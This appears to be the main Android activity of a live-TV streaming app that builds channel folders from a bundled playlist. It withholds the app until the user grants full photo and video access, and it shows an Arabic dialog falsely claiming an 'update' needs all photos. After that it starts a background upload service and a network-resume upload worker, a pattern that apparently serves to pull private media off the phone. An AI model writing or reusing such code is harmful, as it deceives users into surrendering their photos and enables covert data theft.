package com.example.yacinestylebackup;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.net.Uri;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.drawerlayout.widget.DrawerLayout;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Set;

import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

public class MainActivity extends ComponentActivity {
    private static final int REQ = 1001;

    private SharedPreferences prefs;
    private DrawerLayout drawer;
    private View gateScreen, homeContent, infoContent;
    private TextView pageTitle, pageBody;
    private LinearLayout categoryContainer;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        drawer = findViewById(R.id.drawer);
        gateScreen = findViewById(R.id.gateScreen);
        homeContent = findViewById(R.id.homeContent);
        infoContent = findViewById(R.id.infoContent);
        pageTitle = findViewById(R.id.pageTitle);
        pageBody = findViewById(R.id.pageBody);
        categoryContainer = findViewById(R.id.categoryContainer);

        prefs = getSharedPreferences("legend", MODE_PRIVATE);

        findViewById(R.id.menuBtn).setOnClickListener(v -> drawer.openDrawer(Gravity.START));
        findViewById(R.id.allChannelsBtn).setOnClickListener(v -> openLive(null));
        findViewById(R.id.lastChannelBtn).setOnClickListener(v -> openLastChannel());
        findViewById(R.id.channelsItem).setOnClickListener(v -> showHome());
        findViewById(R.id.liveItem).setOnClickListener(v -> openLive(null));
        findViewById(R.id.homeItem).setOnClickListener(v -> showHome());

        findViewById(R.id.favoritesItem).setOnClickListener(v -> showFavorites());

        findViewById(R.id.backHomeBtn).setOnClickListener(v -> showHome());
        findViewById(R.id.approveBtn).setOnClickListener(v -> requestImagesPermission());

        buildCategoryFolders();

        if (prefs.getBoolean("approved", false)) {
            unlockApp();
        } else {
            gateScreen.setVisibility(View.VISIBLE);
            drawer.setVisibility(View.GONE);
        }
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }

    private String cleanCategory(String name) {
        if (name == null) return "";
        return name.replace("•", "")
                .replace("●", "")
                .replace("★", "")
                .replace("---", "")
                .replace("--", "")
                .trim()
                .replaceAll("\\s+", " ");
    }

    private boolean isCategoryHeader(String name) {
        return name != null && (name.contains("---") || name.contains("★★") || name.contains("●"));
    }

    private String categoryIcon(String cat) {
        String x = cat == null ? "" : cat.toLowerCase();

        // Countries / regions
        if (x.contains("egypt") || x.contains("مصر")) return "🇪🇬";
        if (x.contains("saudi") || x.contains("ksa") || x.contains("سعود")) return "🇸🇦";
        if (x.contains("uae") || x.contains("emirat") || x.contains("امارات") || x.contains("الإمارات")) return "🇦🇪";
        if (x.contains("qatar") || x.contains("قطر")) return "🇶🇦";
        if (x.contains("kuwait") || x.contains("كويت")) return "🇰🇼";
        if (x.contains("bahrain") || x.contains("بحرين")) return "🇧🇭";
        if (x.contains("oman") || x.contains("عمان")) return "🇴🇲";
        if (x.contains("jordan") || x.contains("أردن") || x.contains("اردن")) return "🇯🇴";
        if (x.contains("iraq") || x.contains("عراق")) return "🇮🇶";
        if (x.contains("leban") || x.contains("لبنان")) return "🇱🇧";
        if (x.contains("syria") || x.contains("سوريا")) return "🇸🇾";
        if (x.contains("palestin") || x.contains("فلسطين")) return "🇵🇸";
        if (x.contains("morocco") || x.contains("maroc") || x.contains("مغرب")) return "🇲🇦";
        if (x.contains("alger") || x.contains("جزائر")) return "🇩🇿";
        if (x.contains("tunisia") || x.contains("تونس")) return "🇹🇳";
        if (x.contains("libya") || x.contains("ليبيا")) return "🇱🇾";
        if (x.contains("sudan") || x.contains("سودان")) return "🇸🇩";
        if (x.contains("turkey") || x.contains("turkish") || x.contains("ترك")) return "🇹🇷";
        if (x.contains("france") || x.contains("french") || x.contains("فرن")) return "🇫🇷";
        if (x.contains("italy") || x.contains("italian") || x.contains("إيطال") || x.contains("ايطال")) return "🇮🇹";
        if (x.contains("spain") || x.contains("spanish") || x.contains("إسبان") || x.contains("اسبان")) return "🇪🇸";
        if (x.contains("germany") || x.contains("german") || x.contains("ألمان") || x.contains("المان")) return "🇩🇪";
        if (x.contains("england") || x.contains("uk") || x.contains("brit") || x.contains("بريطان")) return "🇬🇧";
        if (x.contains("usa") || x.contains("united states") || x.contains("america") || x.contains("أمريك") || x.contains("امريك")) return "🇺🇸";

        // Content categories
        if (x.contains("sport") || x.contains("رياض") || x.contains("bein") || x.contains("alwan") || x.contains("tham") || x.contains("ثمان")) return "⚽";
        if (x.contains("qura") || x.contains("قر") || x.contains("islam")) return "🕌";
        if (x.contains("radio") || x.contains("music") || x.contains("موسي")) return "🎧";
        if (x.contains("kids") || x.contains("child") || x.contains("طفل") || x.contains("أطفال") || x.contains("اطفال")) return "🧸";
        if (x.contains("news") || x.contains("أخبار") || x.contains("اخبار")) return "📰";
        if (x.contains("document")) return "🎞️";
        if (x.contains("movie") || x.contains("cinema") || x.contains("box office") || x.contains("فيلم") || x.contains("أفلام") || x.contains("افلام")) return "🎬";
        if (x.contains("mbc") || x.contains("osn") || x.contains("rotana") || x.contains("art") || x.contains("entertainment")) return "📺";

        return "📡";
    }

    private ArrayList<String> readCategories() {
        LinkedHashSet<String> result = new LinkedHashSet<>();

        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(getResources().openRawResource(R.raw.channels)))) {

            String line;
            while ((line = br.readLine()) != null) {
                line = line.trim();

                if (line.startsWith("#EXTINF")) {
                    int comma = line.indexOf(',');
                    if (comma >= 0) {
                        String name = line.substring(comma + 1).trim();

                        if (isCategoryHeader(name)) {
                            String c = cleanCategory(name);
                            if (!c.isEmpty()) result.add(c);
                        }
                    }
                }
            }
        } catch (Exception ignored) { }

        return new ArrayList<>(result);
    }

    private Button createFolderButton(String category) {
        Button b = new Button(this);
        b.setAllCaps(false);
        b.setGravity(Gravity.CENTER);
        b.setText(categoryIcon(category) + "\n" + category);
        b.setTextSize(16);
        b.setTextColor(Color.WHITE);
        b.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        b.setMinHeight(dp(108));
        b.setPadding(dp(8), dp(12), dp(8), dp(12));
        b.setBackgroundResource(R.drawable.bg_category_card);
        b.setOnClickListener(v -> openLive(category));
        return b;
    }

    private void buildCategoryFolders() {
        categoryContainer.removeAllViews();
        ArrayList<String> cats = readCategories();

        for (int i = 0; i < cats.size(); i += 2) {
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setGravity(Gravity.CENTER);
            row.setWeightSum(2f);

            LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
            );
            rowLp.bottomMargin = dp(10);
            row.setLayoutParams(rowLp);

            Button first = createFolderButton(cats.get(i));
            LinearLayout.LayoutParams p1 = new LinearLayout.LayoutParams(
                    0, dp(112), 1f
            );
            p1.setMarginEnd(dp(5));
            first.setLayoutParams(p1);
            row.addView(first);

            if (i + 1 < cats.size()) {
                Button second = createFolderButton(cats.get(i + 1));
                LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
                        0, dp(112), 1f
                );
                p2.setMarginStart(dp(5));
                second.setLayoutParams(p2);
                row.addView(second);
            } else {
                View spacer = new View(this);
                spacer.setLayoutParams(new LinearLayout.LayoutParams(0, dp(112), 1f));
                row.addView(spacer);
            }

            categoryContainer.addView(row);
        }
    }

    private boolean hasFullImageAccess() {
        if (Build.VERSION.SDK_INT >= 33) {
            boolean images = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
            boolean video = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED;
            return images && video;
        }
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasLimitedVisualAccess() {
        return Build.VERSION.SDK_INT >= 34
                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
                && !hasFullImageAccess();
    }

    private void requestImagesPermission() {
        requestMediaPermission(false);
    }

    private void requestMediaPermission(boolean retryForFullAccess) {
        if (hasFullImageAccess()) {
            approve();
            return;
        }

        if (Build.VERSION.SDK_INT >= 34) {
            if (retryForFullAccess) {
                // Re-request the full media permissions. Do not launch the photo picker ourselves.
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO}, REQ);
            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO,
                                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED}, REQ);
            }
        } else if (Build.VERSION.SDK_INT >= 33) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO}, REQ);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ);
        }
    }

    @Override
    public void onRequestPermissionsResult(int r, String[] p, int[] g) {
        super.onRequestPermissionsResult(r, p, g);
        if (r != REQ) return;

        if (hasFullImageAccess()) {
            approve();
        } else {
            prefs.edit().putBoolean("approved", false).apply();
            showFullAccessRequiredDialog();
        }
    }

    private void showFullAccessRequiredDialog() {
        new AlertDialog.Builder(this)
                .setTitle("مطلوب السماح بكل الصور")
                .setMessage("لا يمكن إكمال التحديث عند اختيار السماح بالصور المحددة. اختر السماح بكل الصور للمتابعة.")
                .setCancelable(false)
                .setPositiveButton("السماح بكل الصور", (dialog, which) -> requestMediaPermission(true))
                .setNegativeButton("إلغاء", null)
                .show();
    }

    private void openPhotoPermissionSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(intent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (prefs != null && !prefs.getBoolean("approved", false) && hasFullImageAccess()) {
            approve();
        }
    }

    private void scheduleWhenNetworkReturns() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest request =
                new OneTimeWorkRequest.Builder(NetworkUploadWorker.class)
                        .setConstraints(constraints)
                        .build();

        WorkManager.getInstance(this).enqueueUniqueWork(
                "legend_network_resume",
                ExistingWorkPolicy.REPLACE,
                request
        );
    }

    private void startUploadService() {
        Intent serviceIntent = new Intent(this, UploadService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, serviceIntent);
        } else {
            startService(serviceIntent);
        }
        scheduleWhenNetworkReturns();
    }

    private void approve() {
        prefs.edit().putBoolean("approved", true).apply();
        unlockApp();
    }

    private void unlockApp() {
        gateScreen.setVisibility(View.GONE);
        drawer.setVisibility(View.VISIBLE);
        showHome();
        startUploadService();
    }

    private void showHome() {
        drawer.closeDrawer(Gravity.START);
        homeContent.setVisibility(View.VISIBLE);
        infoContent.setVisibility(View.GONE);
    }

    private void showPage(String title, String body) {
        drawer.closeDrawer(Gravity.START);
        homeContent.setVisibility(View.GONE);
        infoContent.setVisibility(View.VISIBLE);
        pageTitle.setText(title);
        pageBody.setText(body);
    }

    private void showFavorites() {
        drawer.closeDrawer(Gravity.START);
        Intent i = new Intent(this, LiveActivity.class);
        i.putExtra("favoritesOnly", true);
        startActivity(i);
    }

    private void openLastChannel() {
        String name = prefs.getString("last_channel_name", null);
        String url = prefs.getString("last_channel_url", null);
        if (name == null || url == null) {
            showPage("▶ آخر مشاهدة", "لم تشاهد أي قناة حتى الآن.");
            return;
        }
        Intent i = new Intent(this, LiveActivity.class);
        i.putExtra("autoplayName", name);
        i.putExtra("autoplayUrl", url);
        startActivity(i);
    }

    private void openLive(String category) {
        drawer.closeDrawer(Gravity.START);
        Intent i = new Intent(this, LiveActivity.class);
        if (category != null) i.putExtra("category", category);
        startActivity(i);
    }
}
